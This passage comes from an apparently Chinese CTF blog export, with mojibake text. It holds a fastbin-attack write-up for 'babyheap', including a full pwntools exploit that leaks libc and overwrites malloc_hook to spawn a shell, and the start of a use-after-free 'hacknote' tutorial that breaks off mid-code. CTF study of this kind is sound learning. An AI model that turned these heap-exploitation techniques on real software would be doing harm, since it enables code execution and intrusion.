src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" /><p>ä¸è¿‡åªè¦åœ¨ä¼ªä»£ç ä¸­ï¼Œå°†æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹ä¸€ä¸‹ï¼Œå°†call alarmæ”¹æˆnopå°±è¡Œã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>æ‰€ä»¥è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„åªæœ‰å †æº¢å‡ºè¿™ä¸€ä¸ªæ¼æ´ã€‚</p><h3 id="B-Leak-Libc-base"><a href="#B-Leak-Libc-base" class="headerlink" title="B.Leak  Libc_base"></a>B.Leak  Libc_base</h3><p>å¯¹äºè¿™ä¸ªé¢˜ç›®å¯ä»¥è¿›è¡Œfastbin_attack,å…ˆæ–°å»º5ä¸ªchunkï¼Œå¤§å°åŠŸèƒ½å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  Add(<span class="number">0x20</span>)<span class="comment">#used for overwrite</span></span><br><span class="line">  Add(<span class="number">0x20</span>)</span><br><span class="line">  Add(<span class="number">0x20</span>)<span class="comment">#used to point the same aera of chunk4</span></span><br><span class="line">  Add(<span class="number">0x20</span>)<span class="comment">#used for overwrite</span></span><br><span class="line">Add(<span class="number">0x80</span>)<span class="comment">#used to leak the libc_base</span></span><br></pre></td></tr></table></figure><p>å„ä¸ªå †å—ç»“æ„å¦‚ä¸‹ï¼š</p><div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:20%;" /></div>â€‹    æ ¹æ®å †ç»“æ„ï¼Œå¡«å……ç©ºä½™éƒ¨åˆ†æ—¶è¦è¿™æ ·å†™è„šæœ¬ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)  + p8(<span class="number">0xC0</span>)</span><br></pre></td></tr></table></figure><p>â€‹        p8(0xC0)ä¹Ÿå°±åˆšå¥½è¦†ç›–åˆ°äº†chunk2çš„FDæŒ‡é’ˆã€‚æ¥ç€å°±æ˜¯ä¸€ç³»åˆ—å†…å­˜å¸ƒå±€ï¼Œç›®çš„æ˜¯è®©leakå‡ºsmall chunk2çš„FDæŒ‡é’ˆï¼Œå› ä¸ºå½“ç¨‹åºä¸­åªæœ‰ä¸€ä¸ªsmall/unsort chunkåœ¨é“¾è¡¨ä¸Šæ—¶ï¼Œå…¶FDå’ŒBKéƒ½æŒ‡å‘è·ç¦»main_arena 0x58çš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š</p><ol><li><p>Leak_addr - 0x58 = main_arena</p></li><li><p>main_arena - 0x3c4b20 = libc_base</p><p>å†…å­˜å¸ƒå±€å¦‚ä¸‹(éå®é™…è„šæœ¬ï¼Œä»…ç”¨äºç†è§£)ï¼š</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  free(chunk1)main_arena--&gt;chunk1</span><br><span class="line">  free(chunk2)main_arena--&gt;chunk2--&gt;chunk1</span><br><span class="line">  fill(chunk0)main_arena--&gt;chunk2--&gt;chunk4 #overwrite</span><br><span class="line">  fill(chunk3)<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line">  <span class="comment">#so we can malloc chunk4 as fastbin</span></span><br><span class="line">  add(0x20)main_arena--&gt;chunk4&lt;--chunk2</span><br><span class="line">  add(<span class="number">0x20</span>)main_arena   chunk4&lt;--chunk2 <span class="comment">#share the same addr</span></span><br><span class="line">  fill(chunk3)<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line"><span class="comment">#so we can pass the check and free chunk4 as smallbin</span></span><br><span class="line">  add(<span class="number">0x80</span>)<span class="comment">#chunk 5 , for avoiding the merging into top_chunk</span></span><br><span class="line">free(chunk4)main_arena-<span class="number">0x58</span>&lt;--chunk4&lt;--chunk2</span><br><span class="line">  dump(chunk2)<span class="comment">#Leak libc_base</span></span><br></pre></td></tr></table></figure><p>â€‹        ç»è¿‡å¸ƒå±€ä¹‹åå¯ä»¥ä½¿å¾—chunk2å’Œchunk4æŒ‡å‘ç›¸åŒã€‚</p><h3 id="C-Getshell"><a href="#C-Getshell" class="headerlink" title="C. Getshell"></a>C. Getshell</h3><p>â€‹        é‚£ä¹ˆç°åœ¨æœ‰äº†libc_baseè¦æ€ä¹ˆåˆ©ç”¨å’§ã€‚å¯ä»¥é€šè¿‡<strong>one_gadget</strong>æœlibcé‡Œçš„excute(â€œ/bin/shâ€)ï¼Œæœå‡ºæ¥çš„ä¸æ­¢ä¸€ä¸ªï¼Œéœ€è¦ä¸€ä¸ªä¸ªå°è¯•ï¼Œå†æ‰¾æœºä¼šè°ƒç”¨è¿è¡Œã€‚ä»Šå¤©æ–°å­¦åˆ°çš„ä¸€ä¸ªå°å§¿åŠ¿ï¼šmain_arenaä¸Šæ–¹æœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå«<strong>malloc_hook</strong>ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¸ºç©ºï¼Œä½†å¦‚æœç³»ç»Ÿåœ¨è°ƒç”¨mallocï¼Œ reallocï¼Œfreeæ—¶ç›‘æµ‹åˆ°malloc_hookéç©ºå°±ä¼šç«‹å³æ‰§è¡Œmalloc_hookä¸­çš„æ±‡ç¼–æŒ‡ä»¤ã€‚é’ˆå¯¹malloc_hookçš„æ”»å‡»ä¼šå¦å¤–å†å†™ä¸€ç¯‡å°è®°ã€‚</p><p>â€‹        æ‰€ä»¥è¯´åˆ©ç”¨æ€è·¯å°±æ˜¯ï¼šå¯ä»¥åˆ©ç”¨å †ï¼Œä¿®æ”¹å †çš„FDæŒ‡é’ˆæŒ‡å‘malloc_hookçš„ä¸€å®šåç§»å¤„ï¼Œä½¿å¾—fill(chunk)æ—¶å¯ä»¥æ°å¥½è¦†ç›–åˆ°malloc_hookå¹¶æ‰§è¡Œã€‚</p><ol><li>å°†chunk4ç”³è¯·å‡ºæ¥å¹¶å°†å…¶å¤§å°å‹ç¼©åœ¨fastchunkçš„èŒƒå›´ã€‚</li><li>é‡Šæ”¾chunk4ï¼Œæ­¤æ—¶ç”¨chunk2è¦†å†™chunk4çš„FDæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘è·ç¦»malloc_hookçš„ä¸€å®šåç§»å¤„ã€‚(å‡†ç¡®åœ°å€ä¸ºlibc_base+0x3C4AEDï¼Œåœ¨æ­¤å¤„æ°å¥½å¯ä»¥åˆ†é…åˆ°åˆé€‚çš„fastbinï¼Œè¿™é‡Œçš„åç§»è®¡ç®—æ¶‰åŠmalloc_hookæ”»å‡»ã€‚)</li><li>ç”³è¯·ä¸¤ä¸ªchunk(fastchunk)ï¼Œç¬¬ä¸€æ¬¡ä¼šåˆ†é…åˆ°chunk4ï¼Œç¬¬äºŒæ¬¡ä¼šåˆ†é…åˆ°æ–°çš„chunk6ï¼Œchunk6çš„åœ°å€æ­£æ˜¯ç›®æ ‡åœ°å€ã€‚</li><li>å°†shellcodeå†™å…¥åˆ°chunk6ã€‚</li><li>æ‰§è¡Œä¸€æ¬¡add()å³å¯getshellã€‚</li></ol><h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D.Exploit"></a>D.Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#used for overwrite0x..............00</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#   0x..............30</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#used to point the same aera of chunk4  0x..............60</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#used for overwrite0x..............90</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#used to leak the libc_base 0x..............C0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0xC0</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)<span class="comment">#now the chunk2 is pointing at the chunk4, they share the same addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#In order to draw the chunk4 into fastbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)<span class="comment">#now the size of chunk4 is 0x30,we can easily malloc it as a fastchunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk4</span></span><br><span class="line"><span class="comment">#In order to put the chunk4 into smallbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment">#now the size of chunk4 is 0x90,we can easily free it as a smallchunk</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#avoid merging into top_chunk :chunk5</span></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freed</span></span><br><span class="line">fd_ptr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">main_arena = fd_ptr - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span><span class="comment">#0x3c4b20 is the offset of main_arena in libc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#transform the chunk4 into fastchunk again,so we are able to fastbin attack</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(main_arena - <span class="number">0x33</span>)</span><br><span class="line"><span class="comment">#the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AED</span></span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#chunk 4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#chunk 6</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">3</span><span class="comment">#length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hook</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload+=p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)<span class="comment">#add() to call excute(&quot;/bin/sh&quot;)  &quot;1&quot;has not meaning</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF (Hacknote)</title>
      <link href="2020/02/28/UAF-Hacknote/"/>
      <url>2020/02/28/UAF-Hacknote/</url>
      
        <content type="html"><![CDATA[<p>â€‹        ä»å¤´å¼€å§‹å­¦ä¹ å †å †å †å †ğŸ˜¥ğŸ˜¥ğŸ˜¥ï¼ˆå…¶å®ä¹‹å‰ä¹Ÿæ²¡å­¦å¤šå°‘ï¼‰ã€‚<span id="more"></span></p><p>â€‹        è¯¾è®¾åšå¾ˆä¹…äº†ï¼Œæ‘¸é±¼åˆ’æ°´ä¹Ÿå¾ˆä¹…äº†ï¼ŒæŠ“ç´§æ—¶é—´ç³»ç»Ÿåœ°è‚ä¸€ä¸‹å †é¢˜å§ã€‚å†ä¸å¥½å¥½å­¦è¦åºŸäº†ã€‚ã€‚</p><h2 id="1-å…³äºUAF"><a href="#1-å…³äºUAF" class="headerlink" title="1.å…³äºUAF"></a>1.å…³äºUAF</h2><p>â€‹        åœ¨mallocå¾—åˆ°ä¸€ä¸ªæŒ‡é’ˆå¹¶ä½¿ç”¨åï¼Œé€šå¸¸è¦å°†å…¶é‡Šæ”¾å¹¶ç½®ç©ºã€‚è‹¥æ˜¯å‡ºç°æœªå°†å…¶ç½®ç©ºçš„æƒ…å†µï¼Œå°±å®¹æ˜“å‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œä½¿å¾—ç”¨æˆ·ä»ç„¶å¯ä»¥è¿ç”¨æŒ‡é’ˆå†…çš„æ•°æ®æˆ–æ˜¯è°ƒç”¨å…¶ä¸­çš„æŒ‡ä»¤ã€‚ç®€å•æ¥è¯´iï¼ŒUAFå°±æ˜¯å¯¹ä¸€ä¸ªå·²é‡Šæ”¾å†…å­˜å—çš„å†åˆ©ç”¨ã€‚</p><h3 id="CTF-wiki-ç›¸å…³å¦‚ä¸‹ï¼š"><a href="#CTF-wiki-ç›¸å…³å¦‚ä¸‹ï¼š" class="headerlink" title="CTF - wiki ç›¸å…³å¦‚ä¸‹ï¼š"></a>CTF - wiki ç›¸å…³å¦‚ä¸‹ï¼š</h3><ul><li><p>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</p></li><li><p>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</p></li><li><p>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</p><p>ï¼ˆLink  - <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/%EF%BC%89">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/ï¼‰</a></p><h3 id="Example-from-how2heap"><a href="#Example-from-how2heap" class="headerlink" title="Example from how2heap"></a>Example from how2heap</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span>  </span><br><span class="line"><span class="keyword">char</span> *myname;  </span><br><span class="line"><span class="built_in"><span class="keyword">void</span></span> (*func)(<span class="keyword">char</span> *str); &#125; NAME; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    NAME *a;  a = (NAME *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct name));  </span><br><span class="line">    a-&gt;func = myprint;  </span><br><span class="line">    a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// free without modify  free(a);  </span></span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;I can also use it&quot;</span>);  </span><br><span class="line">    <span class="comment">// free with modify  </span></span><br><span class="line">    a-&gt;func = printmyname;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// set NULL  a = NULL;  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;can not be printed...&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*The output:</span></span><br><span class="line"><span class="comment">$use_after_free git:(use_after_free) âœ— ./use_after_free        this is my function</span></span><br><span class="line"><span class="comment">I can also use it</span></span><br><span class="line"><span class="comment">call print my name</span></span><br><span class="line"><span class="comment">this pogram will crash...</span></span><br><span class="line"><span class="comment">[1]    38738 segmentation fault (core dumped)  ./use_after_free</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="2-hacknoteå¤ç°"><a href="#2-hacknoteå¤ç°" class="headerlink" title="2.hacknoteå¤ç°"></a>2.hacknoteå¤ç°</h2><p>â€‹        (Link - <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a>)</p><h4 id="A-é¢˜ç›®åˆ†æ"><a href="#A-é¢˜ç›®åˆ†æ" class="headerlink" title="A.é¢˜ç›®åˆ†æ"></a>A.é¢˜ç›®åˆ†æ</h4><p>â€‹        å¸¸è§„æ“ä½œï¼šä¸¢Ubuntu 1.checksec 2.fileï¼ˆå…¶å®æœ‰ä¿æŠ¤ä¹Ÿä¸ä¼šç»•è¿‡ã€‚ã€‚ã€‚tclï¼‰</p><div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 1" style="zoom: 47%;" /> </div>  â€‹        ç„¶åä¸¢IDAçœ‹æºç å’Œä¼ªç ï¼š<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exploit function" style="zoom:100%;" /><p>â€‹        ä¸»è¦å‡½æ•°æœ‰è¿™å‡ ä¸ªï¼Œæ·»åŠ åˆ é™¤è¾“å‡ºä¸»å‡½æ•°ï¼Œmagic()æ˜¯å–œé—»ä¹è§çš„systemåé—¨ã€‚èœé¸¡çœ‹åˆ°åé—¨å‡½æ•°çš„ç¬¬ä¸€ç›´è§‰å°±æ˜¯æ”¹gotè¡¨ï¼Œæˆ–è€…ROPã€‚ã€‚ã€‚ä½†è¿™é‡Œå¥½åƒä¸å¤ªè¡Œï¼Œæ€ä¹ˆè¯´ä¹Ÿæ˜¯ä¸ªæ­£ç»å †é¢˜å•Šã€‚</p><p>â€‹        add_note:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span 